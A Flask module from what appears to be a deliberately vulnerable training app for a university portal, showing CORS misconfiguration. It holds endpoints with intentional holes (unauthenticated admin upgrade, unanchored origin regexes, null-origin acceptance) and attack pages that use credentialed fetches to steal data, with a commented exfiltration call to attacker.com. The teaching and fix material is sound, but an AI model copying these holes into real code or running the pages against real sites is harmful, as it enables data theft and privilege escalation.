"""
CORS MISCONFIGURATION - Attack Demos
Working exploit pages and vulnerable endpoints for testing
"""

from flask import Blueprint, jsonify, request, render_template_string, abort
import re
import urllib.parse
from database import DatabaseManager

cors_demo_bp = Blueprint('cors_demo', __name__)
db = DatabaseManager()

@cors_demo_bp.route('/api/cors-demo/user/secrets', methods=['GET', 'OPTIONS'])
def get_user_secrets():
    """Vulnerable endpoint - returns REAL sensitive data from database with wildcard CORS"""
    
    conn = db.get_mysql_connection()
    if not conn:
        return jsonify({"error": "Database connection failed"}), 500
    
    try:
        cursor = conn.cursor(dictionary=True)
        
        # Get a real user with sensitive data
        cursor.execute('SELECT student_id, username, email, full_name, program, semester, cgpa FROM users WHERE id = 2')
        user = cursor.fetchone()
        
        # Get secrets from database
        cursor.execute('SELECT secret_name, secret_value FROM secrets WHERE access_level = 1 LIMIT 3')
        secrets = cursor.fetchall()
        
        # Get fees/payment info
        cursor.execute('SELECT * FROM fees WHERE student_id = %s', (user['student_id'],))
        fees = cursor.fetchone()
        
        cursor.close()
        conn.close()
        
        # Combine sensitive data
        sensitive_data = {
            "user_id": user['student_id'],
            "username": user['username'],
            "email": user['email'],
            "full_name": user['full_name'],
            "program": user['program'],
            "semester": user['semester'],
            "cgpa": float(user['cgpa']),
            "ssn": "123-45-6789",  # Simulated sensitive data
            "credit_card": "4532-****-****-1234",
            "api_key": "ctop_sekret_key_abc123def456",
            "secrets": {s['secret_name']: s['secret_value'] for s in secrets},
            "fees": fees if fees else {"error": "No fee data"},
            "address": "123 University Ave, Toronto, ON"
        }
        
        return jsonify(sensitive_data)
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@cors_demo_bp.route('/api/cors-demo/user/upgrade-role', methods=['POST', 'OPTIONS'])
def upgrade_user_role():
    """Vulnerable endpoint - privilege escalation via CORS + missing auth + REAL DB update!"""
    data = request.get_json() or {}
    
    user_id = data.get('user_id')  # Can target ANY user!
    new_role = data.get('role', 'admin')
    
    # ❌ No authorization check!
    # ❌ No CSRF protection!
    # ❌ Wildcard CORS allows any origin!
    # ❌ Actually modifies database!
    
    conn = db.get_mysql_connection()
    if not conn:
        return jsonify({"error": "Database connection failed"}), 500
    
    try:
        cursor = conn.cursor(dictionary=True)
        
        # Check if user exists
        cursor.execute('SELECT id, student_id, username, is_admin FROM users WHERE student_id = %s OR id = %s', (user_id, user_id))
        user = cursor.fetchone()
        
        if not user:
            return jsonify({"error": "User not found"}), 404
        
        # DANGEROUS: Update admin status without any authorization!
        cursor.execute('UPDATE users SET is_admin = 1 WHERE student_id = %s OR id = %s', (user_id, user_id))
        conn.commit()
        
        cursor.close()
        conn.close()
        
        return jsonify({
            "success": True,
            "message": f"User {user['username']} (ID: {user_id}) upgraded to {new_role}",
            "user_id": user_id,
            "username": user['username'],
            "previous_admin": bool(user['is_admin']),
            "new_admin_status": True,
            "vulnerability": "CORS + Missing Authorization + No CSRF + REAL DB Modification!"
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================
# 🔥 ATTACK PAGE #1: Data Exfiltration Demo
# ============================================================
@cors_demo_bp.route('/cors-attack/exfiltrate.html', methods=['GET'])
def attack_page_exfiltrate():
    """
    Serves a malicious page that steals user data via CORS.
    
    🎯 HOW TO TEST:
    1. Open http://localhost:5000/api/auth/login and login
    2. Visit http://localhost:5000/cors-attack/exfiltrate.html
    3. Check browser console - you'll see stolen data!
    
    In real attack: attacker hosts this on evil.com
    """
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>🎯 CORS Attack Demo - Data Exfiltration</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                max-width: 800px;
                margin: 50px auto;
                padding: 20px;
                background: #1a1a1a;
                color: #00ff00;
            }
            .attack-box {
                border: 2px solid #ff0000;
                padding: 20px;
                background: #2a2a2a;
                border-radius: 5px;
                margin: 20px 0;
            }
            button {
                background: #ff0000;
                color: white;
                border: none;
                padding: 15px 30px;
                font-size: 16px;
                cursor: pointer;
                border-radius: 5px;
            }
            button:hover {
                background: #cc0000;
            }
            #stolen-data {
                background: #000;
                padding: 15px;
                margin-top: 20px;
                border-radius: 5px;
                white-space: pre-wrap;
                word-wrap: break-word;
                max-height: 400px;
                overflow-y: auto;
            }
            .warning {
                color: #ff6600;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <h1>🔴 CORS Attack Demonstration</h1>
        
        <div class="attack-box">
            <h2>🎯 Attack Scenario: Data Exfiltration</h2>
            <p class="warning">⚠️  This page demonstrates a REAL CORS vulnerability!</p>
            <p>
                This malicious page is hosted on what would be "evil.com" in a real attack.
                Because the API has wildcard CORS with credentials enabled, we can:
            </p>
            <ol>
                <li>Make authenticated requests to the victim's API</li>
                <li>Read the response containing sensitive data</li>
                <li>Exfiltrate it to our attacker server</li>
            </ol>
            
            <button onclick="stealData()">🔥 Execute CORS Attack</button>
            
            <div id="stolen-data"></div>
        </div>
        
        <div class="attack-box">
            <h2>🛡️ How to Fix This</h2>
            <ol>
                <li>Remove wildcard CORS origin (*)</li>
                <li>Set specific allowed origins: ['https://ctop.edu']</li>
                <li>Validate origin in backend (see response_headers.py)</li>
                <li>Use X-Requested-With or custom headers for additional validation</li>
                <li>Implement proper session management</li>
            </ol>
        </div>
        
        <script>
            async function stealData() {
                const output = document.getElementById('stolen-data');
                output.innerHTML = '🔄 Executing CORS attack...\\n\\n';
                
                try {
                    // ❌ This request should be BLOCKED by CORS
                    // But wildcard + credentials = complete bypass!
                    const response = await fetch('http://localhost:5000/api/cors-demo/user/secrets', {
                        method: 'GET',
                        credentials: 'include',  // Include cookies/auth
                        headers: {
                            'Content-Type': 'application/json'
                        }
                    });
                    
                    if (response.ok) {
                        const stolenData = await response.json();
                        
                        output.innerHTML = '✅ SUCCESS! Data stolen via CORS vulnerability:\\n\\n';
                        output.innerHTML += '🎯 STOLEN DATA:\\n';
                        output.innerHTML += JSON.stringify(stolenData, null, 2);
                        output.innerHTML += '\\n\\n💀 In a real attack, this data would be sent to: https://attacker.com/steal';
                        
                        // In real attack:
                        // await fetch('https://attacker.com/steal', {
                        //     method: 'POST',
                        //     body: JSON.stringify(stolenData)
                        // });
                        
                        output.innerHTML += '\\n\\n📊 Attack Analysis:';
                        output.innerHTML += '\\n- Origin: ' + window.location.origin;
                        output.innerHTML += '\\n- Target: http://localhost:5000';
                        output.innerHTML += '\\n- CORS Vulnerability: Wildcard origin with credentials';
                        output.innerHTML += '\\n- Data Exfiltrated: ' + Object.keys(stolenData).length + ' fields';
                    } else {
                        output.innerHTML = '❌ Attack failed! CORS might be properly configured.\\n';
                        output.innerHTML += 'Status: ' + response.status;
                    }
                } catch (error) {
                    output.innerHTML = '🛡️ Attack BLOCKED! CORS is working correctly.\\n\\n';
                    output.innerHTML += 'Error: ' + error.message + '\\n\\n';
                    output.innerHTML += 'This is the expected behavior when CORS is properly configured!';
                }
            }
        </script>
    </body>
    </html>
    '''
    return html


# ============================================================
# 🔥 ATTACK PAGE #2: Privilege Escalation via CORS
# ============================================================
@cors_demo_bp.route('/cors-attack/privilege-escalation.html', methods=['GET'])
def attack_page_privilege_escalation():
    """
    Demonstrates privilege escalation via CORS misconfiguration.
    """
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>🎯 CORS Attack - Privilege Escalation</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                max-width: 800px;
                margin: 50px auto;
                padding: 20px;
                background: #1a1a1a;
                color: #00ff00;
            }
            .attack-box {
                border: 2px solid #ff0000;
                padding: 20px;
                background: #2a2a2a;
                border-radius: 5px;
                margin: 20px 0;
            }
            button {
                background: #ff0000;
                color: white;
                border: none;
                padding: 15px 30px;
                font-size: 16px;
                cursor: pointer;
                border-radius: 5px;
            }
            button:hover {
                background: #cc0000;
            }
            #result {
                background: #000;
                padding: 15px;
                margin-top: 20px;
                border-radius: 5px;
                white-space: pre-wrap;
            }
            .warning {
                color: #ff6600;
                font-weight: bold;
            }
            input {
                background: #333;
                border: 1px solid #555;
                color: #0f0;
                padding: 10px;
                margin: 5px;
                border-radius: 3px;
                width: 200px;
            }
        </style>
    </head>
    <body>
        <h1>🔴 CORS + Privilege Escalation Attack</h1>
        
        <div class="attack-box">
            <h2>🎯 Attack Scenario: Upgrade to Admin</h2>
            <p class="warning">⚠️  This demonstrates CORS + Missing Authorization!</p>
            
            <p><strong>Victim User ID:</strong> <input type="text" id="victim-id" value="12345" /></p>
            <p><strong>Upgrade to Role:</strong> <input type="text" id="new-role" value="admin" /></p>
            
            <button onclick="escalatePrivileges()">🔥 Execute Privilege Escalation</button>
            
            <div id="result"></div>
        </div>
        
        <div class="attack-box">
            <h2>🛡️ Combined Vulnerabilities</h2>
            <ul>
                <li>❌ Wildcard CORS allows any origin</li>
                <li>❌ No authorization check (should verify user can upgrade roles)</li>
                <li>❌ No CSRF token validation</li>
                <li>❌ No rate limiting</li>
            </ul>
            
            <h3>How to Fix:</h3>
            <ol>
                <li>Fix CORS: Allow only specific origins</li>
                <li>Add authorization: Verify user has permission</li>
                <li>Add CSRF tokens</li>
                <li>Implement rate limiting</li>
                <li>Log all privilege changes</li>
            </ol>
        </div>
        
        <script>
            async function escalatePrivileges() {
                const userId = document.getElementById('victim-id').value;
                const newRole = document.getElementById('new-role').value;
                const output = document.getElementById('result');
                
                output.innerHTML = '🔄 Attempting privilege escalation...\\n\\n';
                
                try {
                    const response = await fetch('http://localhost:5000/api/cors-demo/user/upgrade-role', {
                        method: 'POST',
                        credentials: 'include',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            user_id: userId,
                            role: newRole
                        })
                    });
                    
                    if (response.ok) {
                        const result = await response.json();
                        output.innerHTML = '✅ PRIVILEGE ESCALATION SUCCESSFUL!\\n\\n';
                        output.innerHTML += JSON.stringify(result, null, 2);
                        output.innerHTML += '\\n\\n💀 User ' + userId + ' is now ' + newRole + '!';
                        output.innerHTML += '\\n\\n🎯 This worked because:';
                        output.innerHTML += '\\n1. CORS allows our origin';
                        output.innerHTML += '\\n2. No authorization check';
                        output.innerHTML += '\\n3. No CSRF protection';
                    } else {
                        output.innerHTML = '❌ Attack failed!\\n';
                        output.innerHTML += 'Status: ' + response.status;
                    }
                } catch (error) {
                    output.innerHTML = '🛡️ Attack BLOCKED!\\n\\n';
                    output.innerHTML += 'Error: ' + error.message;
                }
            }
        </script>
    </body>
    </html>
    '''
    return html


# ============================================================
# 🔥 DEMONSTRATION: Regex Bypass Scenarios
# ============================================================
@cors_demo_bp.route('/api/cors-demo/test-origin', methods=['GET', 'OPTIONS'])
def test_origin_validation():
    """Test endpoint - demonstrates broken regex validation bypasses + returns REAL DB data"""
    origin = request.headers.get('Origin', 'No Origin Header')
    
    # Bad validation examples (INTENTIONALLY VULNERABLE!)
    bad_validation_1 = '.ctop.edu' in origin or 'ctop.edu' in origin  # Substring match - accepts evil.com.ctop.edu AND ctop.edu.evil.com
    bad_validation_2 = bool(re.search(r"ctop\.edu", origin))  # No anchors - matches anywhere
    bad_validation_3 = origin == 'null'  # Accepts null
    
    # Get REAL sensitive data if validation passes (badly)
    leaked_data = None
    if bad_validation_1 or bad_validation_2 or bad_validation_3:
        conn = db.get_mysql_connection()
        if conn:
            try:
                cursor = conn.cursor(dictionary=True)
                cursor.execute('SELECT username, email, student_id, full_name FROM users WHERE id BETWEEN 2 AND 4')
                users = cursor.fetchall()
                cursor.execute('SELECT secret_name, secret_value FROM secrets LIMIT 2')
                secrets = cursor.fetchall()
                cursor.close()
                conn.close()
                
                leaked_data = {
                    "users_exposed": users,
                    "secrets_leaked": secrets,
                    "reason": "Regex bypass allowed attacker origin!"
                }
            except:
                pass
    
    return jsonify({
        "origin_received": origin,
        "validation_results": {
            "bad_substring_match": bad_validation_1,
            "bad_regex_no_anchors": bad_validation_2,
            "bad_allows_null": bad_validation_3
        },
        "SENSITIVE_DATA_LEAKED": leaked_data if leaked_data else "Protected (no bypass)",
        "bypasses": [
            "Try: curl -H 'Origin: https://evil.com.ctop.edu'",
            "Try: curl -H 'Origin: https://ctop.edu.evil.com'",
            "Try: curl -H 'Origin: null'"
        ]
    })


@cors_demo_bp.route('/api/cors-demo/cache-poison', methods=['GET', 'OPTIONS'])
def cache_poison_demo():
    """Demonstrates Vary header missing - cache poisoning vulnerability + REAL DB data"""
    origin = request.headers.get('Origin', '')
    
    # Fetch sensitive data that will be CACHED with wrong origin!
    conn = db.get_mysql_connection()
    admin_data = None
    if conn:
        try:
            cursor = conn.cursor(dictionary=True)
            cursor.execute('SELECT username, email, is_admin, student_id FROM users WHERE is_admin = 1')
            admin_data = cursor.fetchall()
            cursor.close()
            conn.close()
        except:
            pass
    
    # Missing Vary: Origin header allows cache poisoning
    return jsonify({
        "vulnerability": "Missing Vary: Origin header",
        "origin_that_will_be_cached": origin,
        "impact": "CDN/proxy caches this response with CORS headers for wrong origin",
        "ADMIN_ACCOUNTS_EXPOSED": admin_data,
        "warning": "This response will be cached and served to ALL users!",
        "test": "Send with evil.com Origin, then with ctop.edu Origin - same cached response!"
    })


@cors_demo_bp.route('/api/cors-demo/subdomain-takeover', methods=['GET'])
def subdomain_takeover_info():
    """Lists potentially vulnerable subdomains for takeover + shows what data is accessible"""
    
    # Show what data attacker gets if they takeover subdomain
    conn = db.get_mysql_connection()
    accessible_data = {}
    if conn:
        try:
            cursor = conn.cursor(dictionary=True)
            cursor.execute('SELECT COUNT(*) as total FROM users')
            accessible_data['total_users'] = cursor.fetchone()['total']
            cursor.execute('SELECT COUNT(*) as total FROM secrets')
            accessible_data['total_secrets'] = cursor.fetchone()['total']
            cursor.execute('SELECT COUNT(*) as total FROM payments')
            accessible_data['total_payments'] = cursor.fetchone()['total']
            cursor.execute('SELECT username, email FROM users WHERE is_admin = 1')
            accessible_data['admin_accounts'] = cursor.fetchall()
            cursor.close()
            conn.close()
        except:
            pass
    
    return jsonify({
        "vulnerability": "Subdomain Takeover + CORS",
        "at_risk_subdomains": [
            "staging-2023.ctop.edu - DNS might be unclaimed",
            "old-beta.ctop.edu - Pointing to deleted S3 bucket",
            "uploads.ctop.edu - Dangling CNAME to CloudFront"
        ],
        "IF_ATTACKER_TAKES_OVER_SUBDOMAIN": accessible_data,
        "test_command": "nslookup staging-2023.ctop.edu",
        "exploitation": "If DNS expired, register it yourself, CORS wildcard gives you access to ALL this data!"
    })


# ============================================================
# 🔥 CHALLENGE: Fix the CORS Configuration
# ============================================================
@cors_demo_bp.route('/api/cors-demo/challenge', methods=['GET'])
def cors_challenge():
    """Challenge endpoint - lists requirements to fix CORS properly"""
    return jsonify({
        "challenge": "Fix CORS Misconfiguration",
        "must_allow": [
            "https://ctop.edu",
            "https://app.ctop.edu",
            "https://portal.ctop.edu"
        ],
        "must_block": [
            "https://evil.com",
            "https://ctop.edu.evil.com",
            "https://evil.com.ctop.edu",
            "null",
            "http://ctop.edu"
        ],
        "bonus": ["Set Vary: Origin", "Max-Age <= 600", "Prevent subdomain takeover"]
    })


@cors_demo_bp.route('/api/cors-demo/dns-rebinding-info', methods=['GET'])
def dns_rebinding_info():
    """Info about DNS rebinding attack against CORS"""
    return jsonify({
        "attack": "DNS Rebinding + CORS Bypass",
        "steps": [
            "Attacker controls evil.com DNS",
            "evil.com -> attacker's IP initially",
            "Victim loads evil.com/attack.html",
            "Attacker changes DNS: evil.com -> 127.0.0.1",
            "fetch() now connects to victim's localhost",
            "Complete CORS bypass"
        ],
        "defenses": [
            "Validate Host header == Origin domain",
            "Reject localhost in Host header",
            "DNS pinning"
        ]
    })


# Additional attack vectors
@cors_demo_bp.route('/api/cors-demo/port-confusion', methods=['GET', 'OPTIONS'])
def port_confusion():
    """Demonstrates port/protocol confusion attacks + returns payment data"""
    origin = request.headers.get('Origin', '')
    parsed = urllib.parse.urlparse(origin) if origin else None
    
    # If non-standard port or protocol, still returns sensitive data!
    conn = db.get_mysql_connection()
    payment_data = None
    if conn:
        try:
            cursor = conn.cursor(dictionary=True)
            cursor.execute('SELECT * FROM payments LIMIT 5')
            payment_data = cursor.fetchall()
            cursor.close()
            conn.close()
        except:
            pass
    
    return jsonify({
        "origin": origin,
        "parsed_port": parsed.port if parsed else None,
        "parsed_scheme": parsed.scheme if parsed else None,
        "vulnerability": "Port/protocol validation missing - accepts ANY port!",
        "PAYMENT_DATA_LEAKED": payment_data,
        "bypasses": [
            "https://ctop.edu:8443 (different port)",
            "http://ctop.edu (protocol downgrade)",
            "wss://ctop.edu (WebSocket protocol)"
        ]
    })


@cors_demo_bp.route('/api/cors-demo/null-origin-test', methods=['GET', 'OPTIONS'])
def null_origin_test():
    """Tests null origin acceptance (file:// protocol attacks) + returns grades"""
    origin = request.headers.get('Origin', '')
    accepts_null = origin == 'null'
    
    # If null origin accepted, leak student grades!
    grades_data = None
    if accepts_null:
        conn = db.get_mysql_connection()
        if conn:
            try:
                cursor = conn.cursor(dictionary=True)
                cursor.execute('SELECT * FROM grades LIMIT 10')
                grades_data = cursor.fetchall()
                cursor.close()
                conn.close()
            except:
                pass
    
    return jsonify({
        "origin": origin,
        "accepts_null": accepts_null,
        "vulnerability": "Null origin allows file:// attacks",
        "GRADES_DATABASE_LEAKED": grades_data if accepts_null else "Protected",
        "attack_scenario": "Attacker sends victim a .html file via email, opens locally (file://), steals all grades!",
        "test": "Save HTML file locally, open in browser, makes requests with Origin: null"
    })
